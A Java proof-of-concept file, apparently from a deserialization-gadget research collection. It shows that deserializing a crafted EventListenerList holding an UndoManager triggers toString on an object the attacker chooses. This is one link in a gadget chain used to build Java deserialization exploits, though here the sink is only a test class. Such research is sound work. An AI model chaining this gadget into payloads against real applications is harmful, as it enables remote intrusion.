package com.xiinnn.readobject2tostring;

import com.xiinnn.template.ToStringClass;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Vector;

// EventListenerList#readObject -> toString
public class EventListenerListReadObject2ToString {
    public static void main(String[] args) throws Exception{
        ToStringClass toStringClass = new ToStringClass();
        EventListenerList list = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector) getFieldValue(manager, "edits");
        vector.add(toStringClass);
        setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});
        byte[] code = serialize(list);
        unserialize(code);
    }
    public static Object getFieldValue(Object obj, String fieldName) throws Exception{
        Field field = null;
        Class c = obj.getClass();
        for (int i = 0; i < 5; i++) {
            try {
                field = c.getDeclaredField(fieldName);
            } catch (NoSuchFieldException e){
                c = c.getSuperclass();
            }
        }
        field.setAccessible(true);
        return field.get(obj);
    }
    public static void setFieldValue(Object obj, String field, Object val) throws Exception{
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }
    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }
    public static void unserialize(byte[] code) throws Exception{
        ByteArrayInputStream bais = new ByteArrayInputStream(code);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}
